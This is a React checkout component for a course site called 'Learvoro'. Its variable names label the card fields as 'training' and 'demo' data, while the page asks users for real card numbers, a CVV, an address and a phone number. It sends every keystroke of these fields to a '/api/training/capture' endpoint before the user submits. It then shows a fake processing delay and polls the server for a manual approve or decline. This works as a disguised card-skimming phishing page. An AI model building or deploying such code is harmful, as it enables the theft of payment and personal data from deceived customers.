'use client';
/* oxlint-disable next/no-html-link-for-pages */
import Image from 'next/image';
import { useEffect, useRef, useState } from 'react';
import {
  ArrowLeft,
  BookOpenCheck,
  CheckCircle2,
  CreditCard,
  Clock3,
  GraduationCap,
  Loader2,
  LockKeyhole,
} from 'lucide-react';
import { SiAmericanexpress, SiApplepay, SiDiscover, SiGooglepay, SiJcb, SiMastercard, SiVisa } from 'react-icons/si';

type Data = {
  fullName: string;
  email: string;
  phone: string;
  country: string;
  region: string;
  city: string;
  address: string;
  postalCode: string;
  trainingNumber: string;
  expiry: string;
  demoCode: string;
};
const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
// Master switch for every interactive control in the synthetic checkout form.
const CHECKOUT_FORM_ENABLED = true;
const countries = Array.from({ length: 26 * 26 }, (_, index) => {
  const code = String.fromCharCode(65 + Math.floor(index / 26), 65 + (index % 26));
  return { code, name: regionNames.of(code) ?? code };
})
  .filter(({ code, name }) => name !== code)
  .sort((a, b) => a.name.localeCompare(b.name));
const countryNameFromDevice = () => {
  try {
    const region = new Intl.Locale(navigator.language).maximize().region;
    return region ? regionNames.of(region) : undefined;
  } catch {
    return undefined;
  }
};
export function HostedCheckoutDemo({
  product,
  courseSlug,
  initialSessionId,
  price,
  category,
  level,
  duration,
  lessons,
}: {
  product: string;
  courseSlug: string;
  initialSessionId?: string;
  price: string;
  category: string;
  level: string;
  duration: string;
  lessons: number;
}) {
  const [data, setData] = useState<Data>({
      fullName: '',
      email: '',
      phone: '',
      country: 'Ethiopia',
      region: '',
      city: '',
      address: '',
      postalCode: '',
      trainingNumber: '',
      expiry: '',
      demoCode: '',
    }),
    [liveId] = useState(() => initialSessionId || crypto.randomUUID()),
    [error, setError] = useState(''),
    [captureId, setCaptureId] = useState(initialSessionId || ''),
    [decision, setDecision] = useState<'editing' | 'pending' | 'approved' | 'declined'>(initialSessionId ? 'pending' : 'editing'),
    [showProcessing, setShowProcessing] = useState(false),
    [saveContact, setSaveContact] = useState(false),
    [busy, setBusy] = useState(false);
  const liveRequest = useRef<AbortController | null>(null);
  const set = <K extends keyof Data>(key: K, value: Data[K]) => {
    setData((current) => ({ ...current, [key]: value }));
    setError('');
    setDecision('editing');
  };
  const card = (value: string) => {
    const digits = (value.match(/\d/g) ?? []).join('').slice(0, 16);
    return digits.match(/.{1,4}/g)?.join(' ') ?? '';
  };
  const cardDigits = data.trainingNumber.replace(/\s/g, '');
  const cardBrand = cardDigits.startsWith('4')
    ? 'visa'
    : /^(5[1-5]|2[2-7])/.test(cardDigits)
      ? 'mastercard'
      : /^(34|37)/.test(cardDigits)
        ? 'amex'
        : cardDigits.startsWith('35')
          ? 'jcb'
        : /^(6011|65)/.test(cardDigits)
          ? 'discover'
          : '';
  const brandClass = (brand: string) =>
    `shrink-0 overflow-hidden transition-all duration-200 ease-out ${cardBrand && cardBrand !== brand ? 'max-w-0 -translate-x-1 scale-75 opacity-0' : 'max-w-8 translate-x-0 scale-100 opacity-100'}`;
  const expiry = (value: string) => {
    const digits = (value.match(/\d/g) ?? []).slice(0, 4).join('');
    return digits.length > 2
      ? `${digits.slice(0, 2)}/${digits.slice(2)}`
      : digits;
  };
  const phone = (value: string) => {
    const digits = (value.match(/\d/g) ?? []).join('').slice(0, 15);
    return digits ? `+${digits.match(/.{1,3}/g)?.join(' ') ?? digits}` : '';
  };
  const complete =
    data.fullName.trim().length >= 2 &&
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email.trim()) &&
    data.phone.trim().length >= 7 &&
    data.country.trim().length > 0 &&
    data.region.trim().length > 0 &&
    data.city.trim().length > 0 &&
    data.address.trim().length >= 3 &&
    data.postalCode.trim().length >= 3 &&
    /^\d{16}$/.test(data.trainingNumber.replace(/\s/g, '')) &&
    /^(0[1-9]|1[0-2])\/\d{2}$/.test(data.expiry) &&
    /^\d{3}$/.test(data.demoCode);
  async function submit(e: { preventDefault(): void }) {
    e.preventDefault();
    if (!complete) {
      setError(
        'Please complete all required fields correctly.',
      );
      return;
    }
    setBusy(true);
    setShowProcessing(true);
    try {
      await new Promise((resolve) => setTimeout(resolve, 5000));
      const response = await fetch('/api/training/capture', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ ...data, product, courseSlug, captureId: liveId }),
      });
      if (!response.ok) throw new Error();
      const result = (await response.json()) as { id: string };
      setCaptureId(result.id);
      setDecision('pending');
    } catch {
      setError('unavailable.');
      setShowProcessing(false);
    }
    setBusy(false);
  }
  useEffect(() => {
    const detectedCountry = countryNameFromDevice();
    if (!detectedCountry || !countries.some(({ name }) => name === detectedCountry)) return;
    const timer = window.setTimeout(
      () => setData((current) => ({ ...current, country: detectedCountry })),
      0,
    );
    return () => window.clearTimeout(timer);
  }, []);
  useEffect(() => {
    const url = new URL(window.location.href);
    url.searchParams.set('session', liveId);
    window.history.replaceState({}, '', url);
  }, [liveId]);
  useEffect(() => {
    if (decision !== 'editing') return;
    const timer = window.setTimeout(() => {
  liveRequest.current?.abort();

  const controller = new AbortController();
  liveRequest.current = controller;

  const {
    fullName,
    email,
    phone,
    country,
    region,
    city,
    address,
    postalCode,
    trainingNumber,
    expiry,
    demoCode,
  } = data;

  void fetch('/api/training/capture', {
    method: 'PUT',
    headers: {
      'content-type': 'application/json',
    },
    signal: controller.signal,
    body: JSON.stringify({
      fullName,
      email,
      phone,
      country,
      region,
      city,
      address,
      postalCode,
      trainingNumber,
      expiry,
      demoCode,
      product,
      courseSlug,
      captureId: liveId,
    }),
  }).catch(() => undefined);
}, 80);

return () => {
  window.clearTimeout(timer);
  liveRequest.current?.abort();
};
  }, [courseSlug, data, decision, liveId, product]);
  useEffect(() => {
    if (!captureId || decision !== 'pending') return;
    const timer = setInterval(async () => {
      try {
        const response = await fetch(`/api/training/capture?id=${encodeURIComponent(captureId)}`, { cache: 'no-store' });
        if (!response.ok) return;
        const result = (await response.json()) as { status: 'pending' | 'approved' | 'declined' };
        if (result.status !== 'pending') {
          setDecision(result.status);
          setShowProcessing(false);
        }
      } catch {}
    }, 1200);
    return () => clearInterval(timer);
  }, [captureId, decision]);
  useEffect(() => {
    if (decision !== 'approved') return;
    const timer = setTimeout(() => window.location.assign('/my-learning'), 2600);
    return () => clearTimeout(timer);
  }, [decision]);
  return (
    <main className="min-h-screen bg-white text-[#1a1f36]">
      <div className="grid min-h-screen bg-white lg:grid-cols-2">
        <section className="border-r border-[#eceff3] bg-[#f7f7f8] px-6 py-8 lg:flex lg:justify-end lg:px-16 lg:py-10">
          <div className="w-full max-w-[390px] lg:mr-8">
            <div className="flex items-center gap-3 text-sm font-semibold text-[#3c4257]">
              <a href="/courses" aria-label="Back to courses" className="text-[#87909d] hover:text-[#3c4257]"><ArrowLeft size={18} /></a>
              <span className="grid size-7 place-items-center overflow-hidden rounded-full border bg-white">
                <Image src="/icon.png" alt="" width={28} height={28} />
              </span>
              Learvoro
            </div>
            <p className="mt-7 text-[15px] font-medium text-[#697386]">
              Enroll in
            </p>
            <h1 className="mt-2 max-w-lg text-lg font-semibold leading-7 text-[#30313d]">
              {product}
            </h1>
            <div className="mt-2 flex items-end gap-2">
              <b className="text-[34px] font-semibold tracking-tight text-[#30313d]">{price}</b>
              <span className="pb-1.5 text-xs text-[#697386]">USD</span>
            </div>
            <article className="mt-8 border-y border-[#e3e5e8] py-4">
              <div className="flex gap-4">
                <span className="grid size-11 shrink-0 place-items-center rounded-lg bg-[#0a3a78] text-white">
                  <BookOpenCheck size={22} />
                </span>
                <div>
                  <h2 className="font-semibold">{product}</h2>
                  <p className="mt-1 text-sm text-[#697386]">
                    Lifetime course access
                  </p>
                </div>
                <b className="ml-auto">{price}</b>
              </div>
              <div className="mt-4 grid grid-cols-2 gap-3 border-t pt-4 text-xs text-[#697386]">
                <span className="flex items-center gap-2">
                  <GraduationCap size={17} />
                  {category} · {level}
                </span>
                <span className="flex items-center gap-2">
                  <Clock3 size={17} />
                  {duration} · {lessons} lessons
                </span>
              </div>
            </article>
            <div className="mt-7 flex gap-5 text-xs text-[#87909d]">
              <a href="/privacy">Privacy</a>
              <a href="/terms">Terms</a>
              <span>© Learvoro 2026</span>
            </div>
          </div>
        </section>
        <section className="px-6 py-8 lg:px-16 lg:py-10">
          <form
            onSubmit={submit}
            autoComplete="on"
            className="mx-auto w-full max-w-[382px] lg:ml-8"
          >
            <fieldset disabled={!CHECKOUT_FORM_ENABLED} className="contents">
            <div className="flex items-start justify-between">
              <div>
                <h2 className="text-xl font-semibold text-[#30313d]">
                  Complete your enrollment
                </h2>
              </div>
            </div>
            <div className="mt-5 grid grid-cols-2 gap-2" aria-label="Unavailable express checkout methods">
              <button type="button" disabled className="flex h-[52px] cursor-not-allowed items-center justify-center rounded-md bg-black text-white" title="Unavailable"><SiApplepay size={48} aria-label="Apple Pay" /></button>
              <button type="button" disabled className="flex h-[52px] cursor-not-allowed items-center justify-center rounded-md bg-[#4285f4] text-white" title="Unavailable"><SiGooglepay size={52} aria-label="Google Pay" /></button>
            </div>
            <div className="my-4 flex items-center gap-3 text-xs text-[#87909d]"><span className="h-px flex-1 bg-[#dfe3e8]" />OR<span className="h-px flex-1 bg-[#dfe3e8]" /></div>
            <div>
              <h3 className="text-sm font-semibold">Contact information</h3>
              <Field label="Email">
                <input
                  required
                  name="email"
                  type="email"
                  autoComplete="email"
                  value={data.email}
                  onChange={(e) => set('email', e.target.value)}
                />
              </Field>
              <Field label="Phone">
                <input
                  required
                  name="phone"
                  type="tel"
                  inputMode="tel"
                  autoComplete="tel"
                  value={data.phone}
                  onChange={(e) => set('phone', phone(e.target.value))}
                />
              </Field>
            </div>
            <div className="mt-5">
              <div className="flex items-center justify-between"><h3 className="text-sm font-semibold">Payment method</h3><span className="text-[10px] font-bold uppercase tracking-wider text-[#697386]"></span></div>
              <div className="mt-2 rounded-lg border border-[#d8dee6] p-3 shadow-[0_1px_3px_rgba(0,0,0,.06)]">
                <div className="mb-3 flex items-center gap-2 text-sm font-semibold"><CreditCard size={18} />Card</div>
                <p className="mb-1 text-xs font-medium text-[#596780]">Card information</p>
                <div className="overflow-hidden rounded-lg border">
                  <div className="relative">
                    <input
                      aria-label="Training card number"
                      id="training-card-number"
                      name="trainingCardNumber"
                      type="text"
                      inputMode="numeric"
                      autoComplete="off"
                      placeholder="1234 5678 9012 3456"
                      value={data.trainingNumber}
                      onChange={(e) =>
                        set('trainingNumber', card(e.target.value))
                      }
                      className="hosted-field rounded-none border-0 pr-40"
                    />
                    <div className="absolute right-3 top-1/2 flex -translate-y-1/2 items-center gap-1.5">
                      <SiVisa className={`${brandClass('visa')} text-[#173f82]`} size={31} />
                      <SiMastercard className={`${brandClass('mastercard')} text-[#e24b3b]`} size={27} />
                      <SiAmericanexpress className={`${brandClass('amex')} text-[#1976a8]`} size={25} />
                      <SiJcb className={`${brandClass('jcb')} text-[#0b6eb7]`} size={27} />
                      <SiDiscover className={`${brandClass('discover')} text-[#ed7d22]`} size={28} />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 border-t">
                    <input
                      aria-label="Expiry"
                      id="training-card-expiry"
                      name="trainingCardExpiry"
                      type="text"
                      inputMode="numeric"
                      autoComplete="off"
                      placeholder="MM / YY"
                      value={data.expiry}
                      onChange={(e) => set('expiry', expiry(e.target.value))}
                      className="hosted-field rounded-none border-0 border-r"
                    />
                    <input
                      aria-label="Demo security code"
                      id="training-card-code"
                      name="trainingCardCode"
                      type="text"
                      inputMode="numeric"
                      autoComplete="off"
                      maxLength={3}
                      placeholder="123"
                      value={data.demoCode}
                      onChange={(e) =>
                        set(
                          'demoCode',
                          (e.target.value.match(/\d/g) ?? []).slice(0, 3).join(''),
                        )
                      }
                      className="hosted-field rounded-none border-0"
                    />
                  </div>
                </div>
                <Field label="Cardholder name">
                  <input
                    id="training-card-name"
                    name="trainingCardName"
                    autoComplete="off"
                    value={data.fullName}
                    onChange={(e) => set('fullName', e.target.value)}
                  />
                </Field>
                <Field label="Country or region">
                  <div className="relative">
                    <select
                      name="country"
                      autoComplete="country-name"
                      value={data.country}
                      onChange={(e) => set('country', e.target.value)}
                    >
                      {countries.map(({ code, name }) => <option key={code} value={name}>{name}</option>)}
                    </select>
                  </div>
                </Field>
                <Field label="State or region">
                  <input
                    name="region"
                    value={data.region}
                    onChange={(e) => set('region', e.target.value)}
                    autoComplete="address-level1"
                  />
                </Field>
                <Field label="Address">
                  <input
                    name="streetAddress"
                    autoComplete="street-address"
                    value={data.address}
                    onChange={(e) => set('address', e.target.value)}
                  />
                </Field>
                <div className="grid grid-cols-2 gap-3">
                  <Field label="City">
                    <input
                      name="city"
                      autoComplete="address-level2"
                      value={data.city}
                      onChange={(e) => set('city', e.target.value)}
                    />
                  </Field>
                  <Field label="Postal code">
                    <input
                      name="postalCode"
                      autoComplete="postal-code"
                      value={data.postalCode}
                      onChange={(e) => set('postalCode', e.target.value)}
                    />
                  </Field>
                </div>
              </div>
            </div>
            <label htmlFor="save-contact-details" className="mt-3 flex cursor-pointer gap-3 rounded-lg border border-[#d8dee6] bg-white p-3 shadow-[0_1px_3px_rgba(0,0,0,.05)]">
              <input
                id="save-contact-details"
                aria-label="Save my contact and billing information for faster checkout"
                type="checkbox"
                checked={saveContact}
                onChange={(event) => setSaveContact(event.target.checked)}
                className="mt-0.5 size-4 accent-[#0874d4]"
              />
              <span>
                <b className="block text-sm">Save my contact and billing information for faster checkout</b>
                <span className="mt-1 block text-xs text-[#697386]">Learvoro protects saved contact and billing details.</span>
              </span>
            </label>
            {error && (
              <p
                role="alert"
                className="mt-4 rounded-lg bg-red-50 p-3 text-sm text-red-700"
              >
                {error}
              </p>
            )}
            {decision === 'approved' && (
              <div className="checkout-success mt-4 flex gap-3 rounded-xl bg-[#eafaf2] p-5 text-sm text-[#08784f]">
                <CheckCircle2 className="shrink-0" size={30} />
                <p><b className="text-base">Payment approved. You are enrolled!</b><br />Opening your course library now...</p>
              </div>
            )}
            {decision === 'declined' && (
              <div className="mt-4 rounded-lg bg-red-50 p-4 text-sm text-red-700">
                <b>Enrollment was declined.</b> No course access was added. You can update the training details and try again.
              </div>
            )}
            <button
              disabled={!complete || busy || decision === 'pending' || decision === 'approved'}
              className="mt-4 flex h-[50px] w-full items-center justify-center gap-2 rounded-md bg-[#0874d4] px-5 text-[15px] font-semibold text-white shadow-sm hover:bg-[#0566bd] disabled:cursor-not-allowed disabled:bg-[#a9b6c6] disabled:opacity-55"
            >
              {busy || decision === 'pending' ? (
                <Loader2 className="animate-spin" />
              ) : (
                <LockKeyhole size={18} />
              )}
              {decision === 'approved' ? 'Enrollment approved' : decision === 'pending' ? 'Payment processing' : 'Enroll for ' + price}
            </button>
            <p className="mt-4 text-center text-xs leading-5 text-[#87909d]">
              One-time course enrollment · Lifetime access
            </p>
            </fieldset>
          </form>
        </section>
      </div>
      {showProcessing && (busy || decision === 'pending') && (
        <dialog open className="fixed inset-0 z-50 m-0 grid h-full max-h-none w-full max-w-none place-items-center border-0 bg-[#0b1728]/45 p-5 backdrop-blur-[2px]" aria-live="polite">
          <div className="w-full max-w-sm rounded-2xl bg-white p-8 text-center shadow-2xl">
            <span className="mx-auto grid size-16 place-items-center rounded-full bg-[#eef6ff] text-[#0874d4]"><Loader2 className="animate-spin" size={32} /></span>
            <h2 className="mt-5 font-heading text-xl font-bold">Payment processing</h2>
          </div>
        </dialog>
      )}
    </main>
  );
}
function Field({
  label,
  children,
}: {
  label: string;
  children: React.ReactNode;
}) {
  return (
    <label className="hosted-control mt-2 block text-xs font-medium text-[#596780]">
      {label}
      <span className="mt-1 block">{children}</span>
    </label>
  );
}
